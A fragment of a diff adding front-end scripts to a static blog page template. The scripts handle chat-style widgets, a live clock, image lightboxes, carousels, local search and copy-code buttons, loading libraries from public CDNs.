+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
